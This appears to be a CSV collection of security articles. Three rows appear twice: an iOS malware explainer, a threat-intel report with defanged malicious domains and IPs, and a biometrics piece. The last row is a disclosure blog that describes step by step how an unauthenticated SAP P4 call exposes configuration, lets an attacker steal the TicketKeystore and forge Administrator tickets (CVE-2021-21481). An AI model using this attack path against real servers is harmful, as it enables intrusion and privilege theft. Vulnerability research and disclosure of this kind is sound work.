id,date,title,summary,content
fa4f5919-e419-53e3-a157-f358b7a49836,19-September-2022,Can your iPhone be hacked? What to know about iOS security,"Common ways for malware to compromise an iPhone or iPad. jailbreaking allows users to sideload apps from third-party stores without Apple’s approval. Fake antivirus, malicious links and malicious messages are common ways to compromise iPhones.","Here are some of the most common ways that an iPhone can be compromised with malware, how to tell it’s happened to you, and how to remove a hacker from your device Let’s be clear: if your iPhone or iPad is connected to the internet, there’s a risk it might get hacked. Sure, statistics seem to support the idea that your iOS device is pretty safe (and Apple keeps adding new safety features ), but your security largely hinges on how you actually use the device. In this article, we’ll look at some of the most common ways for malware to compromise iPhones, some warning signs your own phone may have been hacked, and how to ‘fight back’. One of the biggest complaints about iOS is how slow the operating system is in adopting features that have long been present on Android devices. So to overcome this, some users resort to an option that goes against Apple’s Terms and Conditions: they jailbreak their phone. This bypasses the built-in limitations to content from Apple’s App Store, allowing users to sideload apps and widgets from third-party stores. Sideloading – the act of getting an app from an unofficial store – can also be done by downloading it directly through a website on Safari or any other browser. While allowing, or not, access to content from third-party stores can be debatable , as of now, only the applications on the App Store have been officially reviewed for safety. Meanwhile, the risks are clear: when installing a non-verified app, you are giving it unrestricted access to your device. Apple’s official store on your iOS device is generally known for providing safe content. Any application made available on the App Store has gone through a process that checked for bugs, privacy policy concerns, identification of third-party ad providers, and licensing requirements. But sometimes a bad app(le) slips through the safety net. And a simple calendar event spam, a malicious link shared via messaging apps, or an aggressive advertisement displayed while browsing a website can open the App Store and suggest that you to install one of these inaccurately reviewed apps. And because they are on the official store, there’s no reason to doubt their authenticity, right? Wrong. Such a dodgy app will try to cash in by, for example, selling you something you don’t need (and that doesn’t work) using Apple’s own in-app purchase system. Fake Antivirus found on Apple's App Store charges €134,99 per 3 months for removing non existing viruses. Delivered via scareware ads, results in subscription scam. More about the research: https://t.co/oqL80J3BNR https://t.co/IfwBD1KAdd — Lukas Stefanko (@LukasStefanko) August 5, 2021 Your iPhone’s Calendar app might seem like the safest place on your device, but it is actually one of the most common ways to distribute malware on iOS. Just like anyone you’ve just met can send you a Calendar invitation for a coffee later that week, hackers can do the same! These unwanted invites can come from leaked email addresses or from you after unintentionally subscribed to calendar events on dodgy websites. Remember that scams are designed for people to fall for them. So in case you do, unsubscribe from the calendar and never tap on individual events you don’t know and trust as they will lead you to more spam. Figure 1. Scam website requests a user to subscribe to calendar events on iOS Back in 2010, Apple made it possible to add configuration profiles to its iOS devices. This way, companies could manage on their iPhones a series of specific settings and functions as well as install apps used internally that do not need to be publicly available on the App Store. While this is a useful tool for the legitimate use of companies and schools, hackers learned to take advantage of this feature . As usual, through phishing attacks and social engineering traps, hackers can lead their victims into tapping a link that will install a malicious configuration profile, granting them access to your Wi-Fi, VPN settings, app management, or internet traffic. More than just the privacy and safety risks posed by this kind of threat, most users are not aware of profile management options, giving hackers the time needed to explore and exploit user’s password, steal banking information, or even install spyware . Figure 2. Malicious cryptocurrency wallet app installed via a configuration profile If getting spam on your calendar sounds like a minor risk, having someone tracking you might sound much worse. But the most vicious thing about this type of hacking is that they are all interconnected. What was initially a small spam event invitation can easily escalate to installing a sideloaded app or a malicious configuration profile. Bear in mind that your phone can also fall in the wrong hands without you noticing. This can be particularly sensitive in the context of abusive relationships. Stalkerware – a tool used to access your devices remotely – can be installed on your phone without your consent. Attackers can then target your personal information on iCloud, track your location, or access your photos and notes. If you suspect or fear your iPhone has been hacked, there’s a few things you can check to start with: Figure 3. One of the two apps is an imposter (source: ESET research ) Figure 4. Giving an iPhone a fresh start Everybody can fall victim to a cyberattack, but you can minimize your risks by following a few simple steps. In the end, no matter how likely you are to get hacked, it’s important to understand the risks and implement a few simple precautions. Avoiding to jailbreak your device, refraining from tapping on unfamiliar links. and using multi-factor authentication wherever it’s available will go a long way towards protecting your device and your data."
1f49d0be-00b4-5916-9f33-01a6c10c8c78,28-September-2022,Who Could Be Behind the Latest GitHub-Hosted Malware Infrastructure?,"WhoisXML API threat researcher says GitHub has been used to host malware. The code repository has been linked to hosting several malicious projects in the past. DNS and WHOIS records all point to Russia, the researcher says.","GitHub is a popular code repository used by almost all software developers. Anyone can access it to share their code with practically anyone interested. Unfortunately, not every GitHub user is trustworthy. It has, in fact, been used to host malware at least a couple of times. In March 2018, for instance, cybercriminals hosted cryptocurrency mining malware on GitHub. More recently, a researcher reportedly used the repository to host several malicious projects . WhoisXML API threat researcher Dancho Danchev took a closer look at one such campaign using six domains and subdomains as jump-off points. Danchev’s findings led to the discovery of: A sample of the additional artifacts obtained from our analysis is available for download from our website . Publicly available reports revealed six web properties as IoCs—ovzl[.]jl9544519[.]pr46m[.]vps[.]myjino[.]ru, ovz1[.]9147167707[.]1xdez[.]vps[.]myjino[.]ru, myjino[.]ru, kolobkoproms[.]ug, m[.]ancard[.]ru, and reshenie2014[.]ru. We used these as the starting point for our in-depth investigation. Screenshot lookups for these pages showed that three of them continue to host live albeit insconpiscous content. Note the similarity between their content, though. They all seem to be pointing to myjino[.]ru. A bulk WHOIS lookup for the web properties identified as IoCs revealed that all of them were bulk-registered in the U.S. on 5 October 2011, with R01-RU as their registrar. DNS lookups for the domains and subdomains showed that they resolved to 92 unique IP addresses, all geolocated in Russia and managed by Internet service provider (ISP) JSC RTComm.RU. Given that WHOIS and DNS records all point to Russia, could the perpetrators be based there? According to malware checks on Threat Intelligence Platform (TIP) , four of the IP address resolutions—195[.]161[.]62[.]100, 81[.]177[.]139[.]113, 81[.]177[.]141[.]241, and 81[.]177[.]135[.]89—were dubbed “malicious” by various malware engines. To find more possibly connected artifacts, we used the IP addresses as reverse IP lookup search terms. That led to the discovery of 307 additional domains, 14 of which were tagged “malware hosts” based on a bulk TIP malware check. These properties were: We also looked for additional domains via Domains & Subdomains Discovery using the strings “myjino,” “kolobkoproms,” “ancard,” and “reshenie2014” as search terms. That uncovered 18 domains. We limited the domains to those with the exact terms but different TLD extensions. Of these, one—ancard[.]cn—was malicious. While GitHub has been employing stricter rules to avoid hosting malware since 2021 , cyber attackers are always on the lookout for ways to bypass security measures. As an additional precaution, developers may want to subject their GitHub downloads to malware checks before using them on network-connected systems. Avoiding access to the web properties identified as malicious in this post may also be a worthy endeavor. If you wish to perform a similar investigation or get access to the full data behind this research, please don’t hesitate to contact us ."
d4796dd3-c99d-52aa-850a-5236310acbde,22-September-2022,"Hey WeLiveSecurity, how does biometric authentication work?",Biometric traits are increasingly used as a default authentication technology. Your fingerprint or face can be used to confirm your identity and unlock your phone or car. Apple and other companies have introduced fingerprint sensors in their phones. We look at the pros and cons of using biometric traits for authentication.,"Your eyes may be the window to your soul, but they can also be your airplane boarding pass or the key unlocking your phone. What’s the good and the bad of using biometric traits for authentication? The ability to confirm your identity using your fingerprint or face is something we have already become accustomed to. Most of us carry a piece of this technology in our pockets: Our phones are able to recognize not only our facial features and fingerprints, but also our voices, sleep patterns, and heart and respiratory rates. As biometric identification becomes more common and reliable, it is also increasingly used as a default authentication technology. Chances are, you’re already using your fingerprint or face to unlock your phone, open the door of and start your car, or to manage your bank account. But are we ready to give away all our unique biometric traits in exchange for (a promise of) better security? In this article, we’ll look at some of the most established types of biometric authentication and examine the pros and cons of this ubiquitous technology. Many countries have been using fingerprints on our ID cards and when applying for travel visas, and authorities have long been used (fingerprints and other) biometric features to identify criminals and solve crimes. Fingerprints have been used for centuries . But it was when Apple incorporated a fingerprint sensor into its iPhone 5S in 2013 that this technology first became widely used. Figure 1. Fingerprint authentication in an iPhone Over the years, these technology has developed from the physical iPhone’s Home Button with integrated capacitive sensor capable of generating electric charge when in contact with the fingerprint ridges to map the user’s finger and recognize it. More recently, however, it’s on Android phones that fingerprint sensors have been thriving. Different brand have different approaches for their models, using similar capacitive sensors, under-the-screen optical sensors that use light to create images on the fingerprint or, more recently, ultrasound sensors that bounce a pulse of inaudible sound against the finger to create a complex 3D image. Figure 2. Three types of fingerprint sensors in phones While fingerprint recognition is quite a safe authentication method unless someone steals your fingerprint – or your finger – it all comes down to the reliability of the device you’re using. When it comes to data protection, most big manufacturers, such as Apple, Google or Samsung, store your fingerprint locally and not online. So even when you use your fingerprint to log in to a service or account on your phone, that app will only receive a digital key and not your fingerprint details. What seemed science-fiction not long ago is today another common method of identity verification. Our facial features are now enough to open doors, unlock our smartphones, validate payments and access all the credentials stored in our password manager apps. Face recognition can work in different ways: simple image comparison, video sequences, three-dimensional data, or image composition by multiple cameras. The simplest systems, usually found in cheaper phones, might only compare your face to a previously stored face image, other systems use metrics such as the distance between your eyes, the measure from your forehead to your chin, or the shape of the contours of your lips, however, not always seamlessly . However, things can go rather sour if the technology is used maliciously. While it is up to us whether or not we use this technology on our phones, it might be hard to opt out from CCTV cameras managed by companies or the government , creating a problem of loss of anonymity in public spaces . Figure 3. Face recognition – pros and cons Figure 4. Face recognition options in Android and iOS “ Hey Google ” or “Hey Siri” are simple commands you can use to interact with your phone’s voice assistant. In fact, these are voice recognition systems, responding only to your specific voice commands. When setting up your phone, you are asked to say some sentences out loud, allowing the algorithm to learn voice patterns that it will continue learning through real-world use. The more you talk to a virtual assistant, such as Google , Siri , or Alexa , the more it will recognize your voice patterns. Figure 5. Voice recognition on Android and iOS Biometric authentication is convenient, but it poses new challenges to our privacy and safety. While these technologies can replace long and hard-to-remember passwords, they can also be a way of giving away our personal biometric data without always being certain about how it will be used. Data breaches mean that hackers can access and sell information to malicious actors who might, for example, create molds of our fingerprints and use them to access buildings or devices without our knowledge or consent. And even if we consider how hard these personal features are hard to bypass, other technologies as face recognition expose us all the time. And while governments use the argument of safety to use face recognition cameras, it is hard to know exactly who are the people they will target and how those images can be used in the future. Figure 6. Biometric authentication – pros vs. cons Figure 7. Health data on an iPhone Wearables, such as fitness trackers and smartwatches , are increasingly knowledgeable of our heartbeats, sleep patterns, respiratory rates and even walking steadiness. Soon, even behavioral biometrics, like the way our hands move to take our phones out of our pockets or how we walk, might be enough to identify us. While these technologies are a dive into what we imagine a sci-fi future looks like, their use requires a thoughtful discussion around technological developments, security, and privacy."
fa4f5919-e419-53e3-a157-f358b7a49836,19-September-2022,Can your iPhone be hacked? What to know about iOS security,"Common ways for malware to compromise an iPhone or iPad. jailbreaking allows users to sideload apps from third-party stores without Apple’s approval. Fake antivirus, malicious links and malicious messages are common ways to compromise iPhones.","Here are some of the most common ways that an iPhone can be compromised with malware, how to tell it’s happened to you, and how to remove a hacker from your device Let’s be clear: if your iPhone or iPad is connected to the internet, there’s a risk it might get hacked. Sure, statistics seem to support the idea that your iOS device is pretty safe (and Apple keeps adding new safety features ), but your security largely hinges on how you actually use the device. In this article, we’ll look at some of the most common ways for malware to compromise iPhones, some warning signs your own phone may have been hacked, and how to ‘fight back’. One of the biggest complaints about iOS is how slow the operating system is in adopting features that have long been present on Android devices. So to overcome this, some users resort to an option that goes against Apple’s Terms and Conditions: they jailbreak their phone. This bypasses the built-in limitations to content from Apple’s App Store, allowing users to sideload apps and widgets from third-party stores. Sideloading – the act of getting an app from an unofficial store – can also be done by downloading it directly through a website on Safari or any other browser. While allowing, or not, access to content from third-party stores can be debatable , as of now, only the applications on the App Store have been officially reviewed for safety. Meanwhile, the risks are clear: when installing a non-verified app, you are giving it unrestricted access to your device. Apple’s official store on your iOS device is generally known for providing safe content. Any application made available on the App Store has gone through a process that checked for bugs, privacy policy concerns, identification of third-party ad providers, and licensing requirements. But sometimes a bad app(le) slips through the safety net. And a simple calendar event spam, a malicious link shared via messaging apps, or an aggressive advertisement displayed while browsing a website can open the App Store and suggest that you to install one of these inaccurately reviewed apps. And because they are on the official store, there’s no reason to doubt their authenticity, right? Wrong. Such a dodgy app will try to cash in by, for example, selling you something you don’t need (and that doesn’t work) using Apple’s own in-app purchase system. Fake Antivirus found on Apple's App Store charges €134,99 per 3 months for removing non existing viruses. Delivered via scareware ads, results in subscription scam. More about the research: https://t.co/oqL80J3BNR https://t.co/IfwBD1KAdd — Lukas Stefanko (@LukasStefanko) August 5, 2021 Your iPhone’s Calendar app might seem like the safest place on your device, but it is actually one of the most common ways to distribute malware on iOS. Just like anyone you’ve just met can send you a Calendar invitation for a coffee later that week, hackers can do the same! These unwanted invites can come from leaked email addresses or from you after unintentionally subscribed to calendar events on dodgy websites. Remember that scams are designed for people to fall for them. So in case you do, unsubscribe from the calendar and never tap on individual events you don’t know and trust as they will lead you to more spam. Figure 1. Scam website requests a user to subscribe to calendar events on iOS Back in 2010, Apple made it possible to add configuration profiles to its iOS devices. This way, companies could manage on their iPhones a series of specific settings and functions as well as install apps used internally that do not need to be publicly available on the App Store. While this is a useful tool for the legitimate use of companies and schools, hackers learned to take advantage of this feature . As usual, through phishing attacks and social engineering traps, hackers can lead their victims into tapping a link that will install a malicious configuration profile, granting them access to your Wi-Fi, VPN settings, app management, or internet traffic. More than just the privacy and safety risks posed by this kind of threat, most users are not aware of profile management options, giving hackers the time needed to explore and exploit user’s password, steal banking information, or even install spyware . Figure 2. Malicious cryptocurrency wallet app installed via a configuration profile If getting spam on your calendar sounds like a minor risk, having someone tracking you might sound much worse. But the most vicious thing about this type of hacking is that they are all interconnected. What was initially a small spam event invitation can easily escalate to installing a sideloaded app or a malicious configuration profile. Bear in mind that your phone can also fall in the wrong hands without you noticing. This can be particularly sensitive in the context of abusive relationships. Stalkerware – a tool used to access your devices remotely – can be installed on your phone without your consent. Attackers can then target your personal information on iCloud, track your location, or access your photos and notes. If you suspect or fear your iPhone has been hacked, there’s a few things you can check to start with: Figure 3. One of the two apps is an imposter (source: ESET research ) Figure 4. Giving an iPhone a fresh start Everybody can fall victim to a cyberattack, but you can minimize your risks by following a few simple steps. In the end, no matter how likely you are to get hacked, it’s important to understand the risks and implement a few simple precautions. Avoiding to jailbreak your device, refraining from tapping on unfamiliar links. and using multi-factor authentication wherever it’s available will go a long way towards protecting your device and your data."
1f49d0be-00b4-5916-9f33-01a6c10c8c78,28-September-2022,Who Could Be Behind the Latest GitHub-Hosted Malware Infrastructure?,"WhoisXML API threat researcher says GitHub has been used to host malware. The code repository has been linked to hosting several malicious projects in the past. DNS and WHOIS records all point to Russia, the researcher says.","GitHub is a popular code repository used by almost all software developers. Anyone can access it to share their code with practically anyone interested. Unfortunately, not every GitHub user is trustworthy. It has, in fact, been used to host malware at least a couple of times. In March 2018, for instance, cybercriminals hosted cryptocurrency mining malware on GitHub. More recently, a researcher reportedly used the repository to host several malicious projects . WhoisXML API threat researcher Dancho Danchev took a closer look at one such campaign using six domains and subdomains as jump-off points. Danchev’s findings led to the discovery of: A sample of the additional artifacts obtained from our analysis is available for download from our website . Publicly available reports revealed six web properties as IoCs—ovzl[.]jl9544519[.]pr46m[.]vps[.]myjino[.]ru, ovz1[.]9147167707[.]1xdez[.]vps[.]myjino[.]ru, myjino[.]ru, kolobkoproms[.]ug, m[.]ancard[.]ru, and reshenie2014[.]ru. We used these as the starting point for our in-depth investigation. Screenshot lookups for these pages showed that three of them continue to host live albeit insconpiscous content. Note the similarity between their content, though. They all seem to be pointing to myjino[.]ru. A bulk WHOIS lookup for the web properties identified as IoCs revealed that all of them were bulk-registered in the U.S. on 5 October 2011, with R01-RU as their registrar. DNS lookups for the domains and subdomains showed that they resolved to 92 unique IP addresses, all geolocated in Russia and managed by Internet service provider (ISP) JSC RTComm.RU. Given that WHOIS and DNS records all point to Russia, could the perpetrators be based there? According to malware checks on Threat Intelligence Platform (TIP) , four of the IP address resolutions—195[.]161[.]62[.]100, 81[.]177[.]139[.]113, 81[.]177[.]141[.]241, and 81[.]177[.]135[.]89—were dubbed “malicious” by various malware engines. To find more possibly connected artifacts, we used the IP addresses as reverse IP lookup search terms. That led to the discovery of 307 additional domains, 14 of which were tagged “malware hosts” based on a bulk TIP malware check. These properties were: We also looked for additional domains via Domains & Subdomains Discovery using the strings “myjino,” “kolobkoproms,” “ancard,” and “reshenie2014” as search terms. That uncovered 18 domains. We limited the domains to those with the exact terms but different TLD extensions. Of these, one—ancard[.]cn—was malicious. While GitHub has been employing stricter rules to avoid hosting malware since 2021 , cyber attackers are always on the lookout for ways to bypass security measures. As an additional precaution, developers may want to subject their GitHub downloads to malware checks before using them on network-connected systems. Avoiding access to the web properties identified as malicious in this post may also be a worthy endeavor. If you wish to perform a similar investigation or get access to the full data behind this research, please don’t hesitate to contact us ."
d4796dd3-c99d-52aa-850a-5236310acbde,22-September-2022,"Hey WeLiveSecurity, how does biometric authentication work?",Biometric traits are increasingly used as a default authentication technology. Your fingerprint or face can be used to confirm your identity and unlock your phone or car. Apple and other companies have introduced fingerprint sensors in their phones. We look at the pros and cons of using biometric traits for authentication.,"Your eyes may be the window to your soul, but they can also be your airplane boarding pass or the key unlocking your phone. What’s the good and the bad of using biometric traits for authentication? The ability to confirm your identity using your fingerprint or face is something we have already become accustomed to. Most of us carry a piece of this technology in our pockets: Our phones are able to recognize not only our facial features and fingerprints, but also our voices, sleep patterns, and heart and respiratory rates. As biometric identification becomes more common and reliable, it is also increasingly used as a default authentication technology. Chances are, you’re already using your fingerprint or face to unlock your phone, open the door of and start your car, or to manage your bank account. But are we ready to give away all our unique biometric traits in exchange for (a promise of) better security? In this article, we’ll look at some of the most established types of biometric authentication and examine the pros and cons of this ubiquitous technology. Many countries have been using fingerprints on our ID cards and when applying for travel visas, and authorities have long been used (fingerprints and other) biometric features to identify criminals and solve crimes. Fingerprints have been used for centuries . But it was when Apple incorporated a fingerprint sensor into its iPhone 5S in 2013 that this technology first became widely used. Figure 1. Fingerprint authentication in an iPhone Over the years, these technology has developed from the physical iPhone’s Home Button with integrated capacitive sensor capable of generating electric charge when in contact with the fingerprint ridges to map the user’s finger and recognize it. More recently, however, it’s on Android phones that fingerprint sensors have been thriving. Different brand have different approaches for their models, using similar capacitive sensors, under-the-screen optical sensors that use light to create images on the fingerprint or, more recently, ultrasound sensors that bounce a pulse of inaudible sound against the finger to create a complex 3D image. Figure 2. Three types of fingerprint sensors in phones While fingerprint recognition is quite a safe authentication method unless someone steals your fingerprint – or your finger – it all comes down to the reliability of the device you’re using. When it comes to data protection, most big manufacturers, such as Apple, Google or Samsung, store your fingerprint locally and not online. So even when you use your fingerprint to log in to a service or account on your phone, that app will only receive a digital key and not your fingerprint details. What seemed science-fiction not long ago is today another common method of identity verification. Our facial features are now enough to open doors, unlock our smartphones, validate payments and access all the credentials stored in our password manager apps. Face recognition can work in different ways: simple image comparison, video sequences, three-dimensional data, or image composition by multiple cameras. The simplest systems, usually found in cheaper phones, might only compare your face to a previously stored face image, other systems use metrics such as the distance between your eyes, the measure from your forehead to your chin, or the shape of the contours of your lips, however, not always seamlessly . However, things can go rather sour if the technology is used maliciously. While it is up to us whether or not we use this technology on our phones, it might be hard to opt out from CCTV cameras managed by companies or the government , creating a problem of loss of anonymity in public spaces . Figure 3. Face recognition – pros and cons Figure 4. Face recognition options in Android and iOS “ Hey Google ” or “Hey Siri” are simple commands you can use to interact with your phone’s voice assistant. In fact, these are voice recognition systems, responding only to your specific voice commands. When setting up your phone, you are asked to say some sentences out loud, allowing the algorithm to learn voice patterns that it will continue learning through real-world use. The more you talk to a virtual assistant, such as Google , Siri , or Alexa , the more it will recognize your voice patterns. Figure 5. Voice recognition on Android and iOS Biometric authentication is convenient, but it poses new challenges to our privacy and safety. While these technologies can replace long and hard-to-remember passwords, they can also be a way of giving away our personal biometric data without always being certain about how it will be used. Data breaches mean that hackers can access and sell information to malicious actors who might, for example, create molds of our fingerprints and use them to access buildings or devices without our knowledge or consent. And even if we consider how hard these personal features are hard to bypass, other technologies as face recognition expose us all the time. And while governments use the argument of safety to use face recognition cameras, it is hard to know exactly who are the people they will target and how those images can be used in the future. Figure 6. Biometric authentication – pros vs. cons Figure 7. Health data on an iPhone Wearables, such as fitness trackers and smartwatches , are increasingly knowledgeable of our heartbeats, sleep patterns, respiratory rates and even walking steadiness. Soon, even behavioral biometrics, like the way our hands move to take our phones out of our pockets or how we walk, might be enough to identify us. While these technologies are a dive into what we imagine a sci-fi future looks like, their use requires a thoughtful discussion around technological developments, security, and privacy."
702a9fc0-6bfa-5456-884f-6b77d2a0507b,11-June-2021,About the Unsuccessful Quest for a Deserialization Gadget (or: How I found CVE-2021-21481),Research on SAP J2EE Engine 7.50: a bug in the SAP P4 protocol that allows for exploitation of Java objects. The bug is highly critical and allows for administrative access to the underlying J2ee Engine. SAP has since provided a fix for the bug.,"This blog post describes the research on SAP J2EE Engine 7.50 I did between October 2020 and January 2021. The first part describes how I set off to find a pure SAP deserialization gadget, which would allow to leverage SAP's P4 protocol for exploitation, and how that led me, by sheer coincidence, to an entirely unrelated, yet critical vulnerability, which is outlined in part two. The reader is assumed to be familiar with Java Deserialization and should have a basic understanding of Remote Method Invocation (RMI) in Java. Prologue It was in 2016 when I first started to look into the topic of Java Exploitation, or, more precisely: into exploitation of unsafe deserialization of Java objects. Because of my professional history, it made sense to have a look at an SAP product that was written in Java. Naturally, the P4 protocol of SAP NetWeaver Java caught my attention since it is an RMI-like protocol for remote administration, similar to Oracle WebLogic's T3. In May 2017, I published a blog post about an exploit that was getting RCE by using the Jdk7u21 gadget. At that point, SAP had already provided a fix long ago. Since then, the subject has not left me alone. While there were new deserialization gadgets for Oracle's Java server product almost every month, it surprised me no one ever heard of an SAP deserialization gadget with comparable impact. Even more so, since everybody who knows SAP software knows the vast amount of code they ship with each of their products. It seemed very improbable to me that they would be absolutely immune against the most prominent bug class in the Java world of the past six years. In October 2020 I finally found the time and energy to set off for a new hunt. To my great disappointment, the search was in the end not successful. A gadget that yields RCE similar to the ones from the famous ysoserial project is still not in sight. However in January, I found a completely unprotected RMI call that in the end yielded administrative access to the J2EE Engine. Besides the fact that it can be invoked through P4 it has nothing in common with the deserialization topic. Even though a mere chance find, it is still highly critical and allows to compromise the security of the underlying J2EE server. The bug was filed as CVE-2021-21481. On march 9th 2021, SAP provided a fix. SAP note 3224022 describes the details. P4 and JNDI Listing 1 shows a small program that connects to a SAP J2EE server using P4: The only hint that this code has something to do with a proprietary protocol called P4 is the URL that starts with P4:// . Other than that, everything is encapsulated by P4 RMI calls ( for those who want to refresh their memory about JNDI ). Furthermore, it is not obvious that what is going on behind the scenes has something to do with RMI. However, if you inspect more closely the types of the involved Java objects, you'll find that keysMngr is of type com.sun.proxy.$Proxy (implementing interface KeystoreManagerWrapper ) and keysMngr.getKeystore() is a plain vanilla RMI-call. The argument (the name of the keystore to be instantiated) will be serialized and sent to the server which will return a serialized keystore object (in this case it won't because there is no keystore ""whatever""). Also not obvious is that the instantiation of the InitialContext requires various RMI calls in the background, for example the instantiation of a RemoteLoginContext object that will allow to process the login with the provided credentials. Each of these RMI calls would in theory be a sink to send a deserialization gadget to. In the exploit I mentioned above, one of the first calls inside new InitialContext() was used to send the Jdk7u21 gadget (instead of a java.lang.String object, by the way). Now, since the Jdk7u21 gadget is not available anymore and I was looking for a gadget consisting merely of SAP classes, I had to struggle with a very annoying limitation: The classloader segmentation. SAP J2EE knows various types of software components: interfaces, services, libraries and applications (which can consist of web applications and EJBs). When you deploy a component, you have to declare the dependencies to other components your component relies upon. Usually, web applications depend on 2-3 services and libraries which will have a couple of dependencies to other services and libraries, as well. At the bottom of this dependency chain are the core components. Now, the limitation I was talking about is the fact that the dependency management greatly affects which classes a component can see: It can precisely see all classes of all components it relies upon (plus of course JDK classes) but not more. If your class ships as part of the keystore service above, it will only be able to resolve classes from components the keystore service declares as dependencies. Figure 1: dependencies of the keystore service with all child and parent classloaders This has dramatic consequences for gadget development. Suppose you found a gadget whose classes come from components X, Y and Z but there are no dependencies between these components and in addition, there is no component which depends on all of them. Then, no matter in which classloader context your gadget will be deserialized, at least one of X, Y or Z will be missing in the classpath and the deserialization will end up in a ClassNotFoundException . By using a similar approach to the one described in the GadgetProbe project I found out that at the point the Jdk7u21 gadget was deserialized in the above mentioned exploit, there were only about 160 non-JDK classes visible that implement java.io.Serializable . Not ideal for building an exploit. Going back to listing 1, in case we send a gadget instead of the string ""whatever"", we can tell from figure 1 that classes from ten components (the ones listed beneath ""Direct parent loaders"") will be in the class path. Code that sends an arbitrary serializable object instead of the string ""whatever"" could e.g. look like this (instead of keysMgr.getKeystore() ): If there was a gadget, one could send it with out.writeObject() . With this approach, the critical mass of accessible serializable classes can be significantly increased. The telnet interface of SAP J2EE provides useful information about the services and their dependencies. Regardless of the classloader challenge, I was eager to get an overview of how many serializable classes existed in the server. The number of classes in the core layer, services and libraries amounts to roughly 100,000, and this does not even count application code. I quickly realized that I needed something smarter than the analysis features of Eclipse to handle such volumes. So I developed my own tool which analyses Java bytecode using the OW2 ASM Framwork . It writes object and interface inheritance dependencies, methods, method calls and attributes to a SQLite DB. It turned out that out of the 100,000 classes, about 16,000 implemented java.io.Serializable . The RDBMS approach was pretty handy since it allowed build complex queries like Give classes which are Serializable and Cloneable which implement private void readObject(java.io.ObjectInputStream) and whose toString() method exists and has more than five calls to distinct other methods This question translates to The work on this tool and also the process of constantly inventing new and original queries to find potentially interesting classes was great fun. Unfortunately, it was also in vain. There is a library, which almost allowed to build a wonderful chain from a toString() call to the ubiquitous TemplatesImpl.getOutputProperties() , but the API provided by the library is so very complex and undocumented that, after two months, I gave up in total frustration. There were some more small findings which don't really deserve to be mentioned. However, I'd like to elaborate on one more thing before I'll start part two of the blog post, that covers the real vulnerability. One of the first interesting classes I discovered performs a JNDI lookup with an attacker controlled URL in private void readObject(java.io.ObjectInputStream) . What would have been a direct hit four years ago could at least have been a respectable success in 2020. Remember: Oracle JRE finally switched off remote classloading when resolving LDAP references in 2019 in version JRE 1.8.0_191. Had this been exploitable, it would have opened up an attack avenue at least for systems with outdated JRE. My SAP J2EE was running on top of a JRE version 1.8.0_51 from 2015, so the JNDI injection should have worked, but, to my great surprise, it didn't. The reason can be found in the method getObjectInstance of javax.naming.spi.DirectoryManager : The hightlighted call to getObjectFactoryFromReference is where an attacker needs to get to. The method resolves the JNDI reference using an URLClassLoader and an attacker-supplied codebase. However, as one can easily see, if getObjectFactoryBuilder() returns a non-null object the code returns in either of the two branches of the following if-clause and the call to getObjectFactoryFromReference below is never reached. And that is exactly what happens. SAP J2EE registers an ObjectFactoryBuilder of type com.sap.engine.system.naming.provider.ObjectFactoryBuilderImpl . This class will try to find a factory class based on the factoryName -attribute and completely ignore the codebase -attribute of the JNDI reference. Bottom line is that JNDI injection might never have worked in SAP J2EE, which would eliminate one of the most important attack primitives in the context of Java Deserialization attacks. CVE-2021-21481 After digressing about how I searched for deserialization gadgets, I'd like to cover the real vulnerability now, which has absolutely nothing to do with Java Deserialization. It is a plain vanilla instance of CWE-749: Exposed Dangerous Method or Function. Let's go back to Listing 1. We can see that the JNDI context allows to query interfaces by name, in our example we were querying the KeyStoreManager interface by the name ""keystore"". On several occasions, I had already tried to find an available rich client for SAP J2EE Engine administration that uses P4. Every time I was unsuccessful, I believed such a client did not officially exist, or at least was not at everyone's disposal. However, whenever you install a SAP J2EE Engine, the P4 port is enabled by default and listening on the same network interface as the HTTP(s) services. Because I was totally focussing on Deserialization, for a long time I was oblivious how much information one can glean through the JNDI context. E.g. it is trivial to get all bindings: The list() call allows to simply iterate through all bindings: Interesting items are proxy objects and the _Stub objects. E.g. the proxy for messaging.system.MonitorBean can be cast to com.sap.engine.messaging.app.MonitorHI . During debugging of the server, I had already encountered the class JUpgradeIF_Stub , long before I executed the call from Listing 5. The class has a method openCfg(String path) and it was not difficult to establish that the server version of the call didn't perform any authorization check. This one definitively looked fishy to me, but since I wasn't looking for unprotected RMI calls I put the finding into the box with the label ""check on a rainy sunday afternoon when the kids are busy with someone else"". But then, eventually, I did check it. It didn't take long to realize that I had found a huge problem. Compare Listing 6. The configuration settings of SAP J2EE Engine are organized in a hierarchical structure. The location of an object can be specified by a path, pretty much like a path of a file in the file system. The above code gets a reference to the JUpgradeIF_Stub by querying the JNDI context with name ""MigrationService"", gets an instance of a Configuration object by a call to openCfg() and then walks down the path to the leaf node. The element found there can be exported to an archive that is stored in the file system of the server (call to export(String path) ). If carefully chosen, the local path on the server will point to a root folder of a web application. There, download.zip can simply be downloaded through HTTP. If you want to check for yourself, the UME configuration is stored at cluster_config/system/custom_global/cfg/services/com.sap.security.core.ume.service/properties . You'd probably say ""hey! I need to be Administrator to do that! Where's the harm?"". Right, I thought so, too. But neither do you need to be Administrator, nor do you even have to be authenticated. The following code works perfectly fine: So does the enumeration using ctxt.list() from Listing 5. The fact that authentication is not needed at this point is not new at all by the way, compare CVE-2017-5372 . However, you will get a permission exception when calling keysMngr.getKeystore() (because getKeystore() does have a permission check). But JUpgradeIF.openCfg() was missing the check until SAP fixed it. At this point, even without SAP specific knowledge an attacker can cause significant harm. E.g. flood the server's file system with archives causing a resource exhaustion DoS condition. With a little insider knowledge one can get admin access. In the configuration tree, there is a keystore called TicketKeystore . Its cryptographic key pair is used to sign SAP Logon Tickets. If you steal the keystore, you can issue a ticket for the Administrator user and log on with full admin rights. There are also various other keystores, e.g. for XML signatures and the like (let alone the fact that there is tons of stuff in this store. No one probably knows all the security sensitive things you can get access to ...) This information should be sufficient to the understanding of CVE-2021-21481. The exact location of the keystores in the configuration and the relative local path in order to download the archive by HTTP are left as an exercise to the reader."
